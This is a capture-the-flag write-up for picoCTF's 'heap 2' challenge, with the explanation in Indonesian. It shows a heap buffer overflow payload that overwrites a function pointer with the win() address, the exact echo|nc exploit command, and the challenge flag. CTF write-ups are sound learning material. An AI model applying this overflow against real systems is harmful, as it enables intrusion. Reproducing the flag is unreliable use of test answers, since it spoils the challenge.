<h1>heap 2</h1>
<h3>Description</h3>
<p>
  Can you handle function pointers?
Download the binary <a href='https://artifacts.picoctf.net/c_mimas/87/chall'>here</a>.
Download the source <a href='https://artifacts.picoctf.net/c_mimas/87/chall.c'>here</a>.
Connect with the challenge instance here:
nc mimas.picoctf.net 49404
</p>
<h3>Solution</h3>
<p>Check pada program terdapat fungsi win() untuk mendapatkan flag, tetapi fungsi tidak dapat dipanggil sesuai alur program, ketika program di eksekusi</p>

```console
1. Print Heap
2. Write to buffer
3. Print x
4. Print Flag
5. Exit

Enter your choice: 1
[*]   Address   ->   Value   
+-------------+-----------+
[*]   0x157f6b0  ->   pico
+-------------+-----------+
[*]   0x157f6d0  ->   bico
```
<p>Pada print heap, space address pico dan bico 32 byte, yang bisa direplace dengan string panjang lebih dari 32 byte</p>
<pre>
  payload='12345678901234567890123456789012pico'
</pre>

```console
1. Print Heap
2. Write to buffer
3. Print x
4. Print Flag
5. Exit

Enter your choice: 1    
[*]   Address   ->   Value   
+-------------+-----------+
[*]   0x157f6b0  ->   12345678901234567890123456789012pico
+-------------+-----------+
[*]   0x157f6d0  ->   pico
```
<p>bico menjadi pico, jadi untuk pemanggilan string pico bisa diganti dengan alamat fungsi win()</p>

```console
root@xisco-VirtualBox:/home/xisco/Downloads# objdump -D chall | grep -i win
00000000004011a0 <win>:
00000000004011f0 <check_win>:
```
<pre>
payload = 12345678901234567890123456789012\xa0\x11\x40\x00
</pre>

```console
root@xisco-VirtualBox:/home/xisco/Downloads# echo -e -n "2\n12345678901234567890123456789012\xa0\x11\x40\x00\n4\n" | nc mimas.picoctf.net 49404

I have a function, I sometimes like to call it, maybe you should change it

1. Print Heap
2. Write to buffer
3. Print x
4. Print Flag
5. Exit

Enter your choice: Data for buffer: 
1. Print Heap
2. Write to buffer
3. Print x
4. Print Flag
5. Exit

Enter your choice: picoCTF{and_down_the_road_we_go_904e3edd}
```

<h3>Flag</h3>
<pre>
picoCTF{and_down_the_road_we_go_904e3edd}
</pre>
